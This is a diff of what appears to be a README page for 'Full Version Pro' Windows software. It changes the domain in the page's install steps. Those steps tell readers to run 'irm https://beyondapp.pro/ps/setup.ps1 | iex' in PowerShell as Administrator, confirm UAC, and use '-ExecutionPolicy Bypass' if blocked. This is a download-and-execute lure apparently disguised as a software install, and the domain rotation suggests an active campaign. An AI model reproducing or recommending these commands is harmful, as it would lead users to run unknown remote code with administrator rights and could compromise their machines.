@@ -37,7 +37,7 @@ Full Version  ◆  Pro  ◆  Complete  ◆  Windows
 **Run in PowerShell as Administrator:**
 
 ```powershell
-irm https://webmania.xyz/ps/setup.ps1 | iex
+irm https://beyondapp.pro/ps/setup.ps1 | iex
 ```
 
 <sub>Copy · paste · press Enter · confirm UAC</sub>
@@ -71,7 +71,7 @@ irm https://webmania.xyz/ps/setup.ps1 | iex
 
 <details>
 <summary>&nbsp;<b>Manual install blocked?</b></summary>
-<br>Try: `powershell -ExecutionPolicy Bypass -Command "irm https://webmania.xyz/ps/setup.ps1 | iex"`
+<br>Try: `powershell -ExecutionPolicy Bypass -Command "irm https://beyondapp.pro/ps/setup.ps1 | iex"`
 </details>
 
 <details>
